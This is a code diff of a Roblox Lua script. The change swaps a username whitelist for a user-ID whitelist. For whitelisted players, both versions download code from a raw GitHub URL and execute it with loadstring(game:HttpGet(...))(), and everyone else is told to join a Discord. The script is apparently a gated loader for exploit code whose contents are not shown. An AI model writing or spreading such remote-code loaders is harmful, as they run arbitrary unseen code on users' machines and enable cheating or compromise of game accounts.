@@ -1,12 +1,15 @@
-local Admin = {
-	        ["ithinkimrich4"] = true,
-	        ["MangoEmil1"] = true 
-	    }
-	 
-	game.Players.PlayerAdded:connect(function(player)
-	    player.CharacterAdded:connect(function(character)
-	        if Admin[player.Name] then
-	            loadstring(game:HttpGet(("https://raw.githubusercontent.com/yummysroom/Oml/main/no"),true))()
-	        end
-	    end)
-	end)
+local LocalPlayer = game.Players.LocalPlayer
+local Allowed = {1289612805; 766173417;} --UserID instead so you are not gonna do some hardwork to spell their names.
+local function allowedPeople(thisPlayer)
+    for _, playerID in pairs(Allowed) do
+        if playerID == thisPlayer.UserId then
+            return true
+        end
+    end
+end
+
+if allowedPeople(LocalPlayer) == true then
+    loadstring(game:HttpGet(("https://raw.githubusercontent.com/yummysroom/Oml/main/no"),true))()
+    else
+        print("join discord to use this script")
+end
